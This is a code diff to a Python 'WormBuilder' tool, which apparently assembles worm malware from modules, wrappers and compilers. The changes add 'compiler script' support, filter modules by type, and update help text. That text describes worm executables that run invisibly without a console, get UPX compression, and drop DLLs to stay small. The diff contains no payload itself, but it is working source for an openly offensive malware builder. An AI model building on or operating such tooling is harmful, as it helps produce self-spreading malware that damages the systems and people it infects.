@@ -128,10 +128,26 @@ class WormBuilder:
                 self.add_wrapper(item)
             case "process":
                 self.add_process(item)
+            case "cscript":
+                self.add_compiler_script(item)
         
         self.check_depediences()
             
-            
+    def add_compiler_script(self, item: object) -> None:
+        wcomp = self.raw_worm.globalVar.get("COMPILER")
+        if not wcomp:
+            self.msg("error", "[!!] ERROR: Compiler not set. First, select a compiler for the worm. [!!]")
+            return
+        if not wcomp in item.compiler_compatibility:
+            self.msg("error", f"[!!] ERROR: This script is not compatible with this compiler: '{wcomp}' [!!]")
+            return
+        # if item.compiler_compatibility != wcomp:
+        #     self.msg("error", f"[!!] ERROR: This script is not compatible with this compiler: '{wcomp}' [!!]")
+        #     return
+        self.raw_worm.cscript = item
+        self.msg("msg", f"Add compiler script: '{item.name}' successfull.")
+
+                
     
     def add_worm(self, item: object) -> None:
         if self.raw_worm.master_worm:
@@ -151,9 +167,21 @@ class WormBuilder:
             self.msg("error", "This module has already been added")
             return False
         else:
-            self.raw_worm.modules[item.name] = item
-            self.msg("msg", f"Add new module: '{item.name}' successful")
-            return True
+            if len(self.raw_worm.accepted_modules) == 0 or "all" in self.raw_worm.accepted_modules:
+                self.raw_worm.modules[item.name] = item
+                self.msg("msg", f"Add new module: '{item.name}' successful")
+                return True
+            else:
+                if not item.subTypes in self.raw_worm.accepted_modules:
+                    self.msg("error", f"[!!] This worm does not support this type of modules [!!]")
+                    return False
+                else:
+                    self.raw_worm.modules[item.name] = item
+                    self.msg("msg", f"Add new module: '{item.name}' successful")
+                    return True
+            # self.raw_worm.modules[item.name] = item
+            # self.msg("msg", f"Add new module: '{item.name}' successful")
+            # return True
 
     def add_support(self, item: object) -> bool:
         if item.name in self.raw_worm.support.keys():
@@ -310,6 +338,8 @@ class WormBuilder:
                 self.raw_worm.starter = None
             case "wrapper":
                 self.raw_worm.wrapper = None
+            case "cscript":
+                self.raw_worm.cscript = None
 
         self.msg("msg", f"Remove: '{mod_name}' successful.")
         self.check_depediences()
@@ -343,6 +373,7 @@ class WormBuilder:
             out = self.add_module(rm)
             if out:
                 self.check_depediences()
+        
 
         for name, rv in self.raw_worm.reqVar.items():
             if name in self.raw_worm.var.keys():
@@ -350,12 +381,22 @@ class WormBuilder:
             if name in self.defVar.var:
                 rv.set_value(self.defVar.var[name])
         for name, rf in self.raw_worm.reqFood.items():
-            if name in self.raw_worm.food.keys():
-                continue
+            # if name in self.raw_worm.food.keys():
+            #     continue
             self.add_food(name)
         for name, sv in self.raw_worm.setVar.items():
             self.raw_worm._var[name] = sv
         self.raw_worm.check_garbageVar()
+
+        # check required compiler script
+        for m in self.raw_worm.all_modules:
+            if m.reqCS:
+                if self.raw_worm.cscript:
+                    if m.reqCS != self.raw_worm.cscript.name:
+                        self.Add("cscript", m.reqCS)
+                else:
+                    self.Add("cscript", m.reqCS)
+        
         
         
         
@@ -382,6 +423,14 @@ class WormBuilder:
         text += self.texter.make_2column("--- Tags: ", self.raw_worm.master_worm.system_FLAG)
         if banned:
             text += self.texter.make_2column("--- Banned:", ", ".join(banned))
+        if len(self.raw_worm.accepted_modules) > 0:
+            acm = ""
+            for am in self.raw_worm.accepted_modules:
+                if am == "dll":
+                    acm += "[DLL_modules] "
+                else:
+                    acm += f"[{am}] "
+            text += self.texter.make_2column("--- Accepted Modules:", acm)
         if display:
             self.msg("msg", text)
         else:
@@ -430,7 +479,7 @@ class WormBuilder:
             return ""
         text = self.title("Variables")
         for name, var in self.raw_worm.var.items():
-            # text += self.texter_3c.make_3column(f"# {name}", var.show(), str(var.info))
+
             text += self.texter_4c.make_4column(f"# {name}", f"[{var.owner}]", var.show(), str(var.info))
         if display:
             self.msg("msg", text)
@@ -516,7 +565,7 @@ class WormBuilder:
             return text
     
     def show_compiler(self, display: bool = False, empty_show: bool = False) -> Union[str, None]:
-        comp = self.raw_worm.globalVar.get("COMPILER_NAME")
+        comp = self.raw_worm.globalVar.get("COMPILER")
         text = self.title("Compiler:")
         if not comp:
             text += "# Compiler not set. Default will be used."
@@ -533,7 +582,8 @@ class WormBuilder:
         text += "--- [S] - Support Module. Added automatically by the worm. --- \n"
         text += "--- [LW] - Works on windows and linux ---\n"
         text += "--- [L] - Works only on linux ---\n"
-        text += "--- [W] - Works only on windows\n\n"
+        text += "--- [W] - Works only on windows\n"
+        text += "--- [CS] - Variable tag. File variable 'res' ('rc'). 'Compiler Script' variables do not affect the worm's operation, they are information of the ready executable file.\n"
         if display:
             self.msg("msg", text)
         else:
@@ -545,11 +595,11 @@ class WormBuilder:
         text += texter.make_2column("Name:", "Description:")
         text += texter.make_2column("-- NO_COMPILE --", "Skips the worm compilation step. May lead to problems if further 'process' steps involve working with executable files.")
         text += texter.make_2column("-- USE_UPX --", "Uses compression by default when creating each executable.")
-        text += texter.make_2column("-- COMPILER_NAME --", "The name of the compiler used for compilation.")
+        text += texter.make_2column("-- COMPILER --", "The name of the compiler used for compilation.")
         text += texter.make_2column("-- PROGRAM_TYPE --", "How the executable file is to be run. 'console' - the program is run in the console (useful for testing). 'window' - the program is run invisibly without the console.")
-        text += texter.make_2column("-- COMPILER_NO_DLL --", "It does not include additional DLL libraries in the executable file. It reduces the size of the worm. Most worms use the 'win32api' function so if they are run on windows there is no need to add these libraries there. It works with C and Assembler code.")
-        text += texter.make_2column("-- PRE_COMPILER --", "Using a special build script that allows for more interference in the build process. Available only for PyInstaller. Use the 'WinePyInst' compiler.")
-        text += texter.make_2column("-- PYINSTALLER_EXCLUDE_MODS -- ", "An additional script option that will try not to include unused python libraries in the executable. It may reduce the size of the worm. NOTE: This feature is experimental and may give different results.")
+        text += texter.make_2column("-- NO_DLL --", "It does not include additional DLL libraries in the executable file. It reduces the size of the worm. Most worms use the 'win32api' function so if they are run on windows there is no need to add these libraries there. It works with C and Assembler code.")
+        # text += texter.make_2column("-- PRE_COMPILER --", "Using a special build script that allows for more interference in the build process. Available only for PyInstaller. Use the 'WinePyInst' compiler.")
+        # text += texter.make_2column("-- PYINSTALLER_EXCLUDE_MODS -- ", "An additional script option that will try not to include unused python libraries in the executable. It may reduce the size of the worm. NOTE: This feature is experimental and may give different results.")
         text += self.title("Set by You:")
         if len(self.raw_worm._globalVar) < 1:
             text += "---------- No Variables -----------------\n"
@@ -612,6 +662,7 @@ class WormConfig:
         self.process = None
         self.garbageVar = {}
         self._globalVar = {}
+        self.cscript = None
     
     
     @property
@@ -641,6 +692,8 @@ class WormConfig:
             mods.append(j)
         if self.wrapper:
             mods.append(self.wrapper)
+        if self.cscript:
+            mods.append(self.cscript)
         return mods
 
     @property
@@ -744,3 +797,8 @@ class WormConfig:
                     continue
                 self.garbageVar[name] = gv
     
+    @property
+    def accepted_modules(self) -> list:
+        if not self.master_worm:
+            return []
+        return self.master_worm.acceptMods
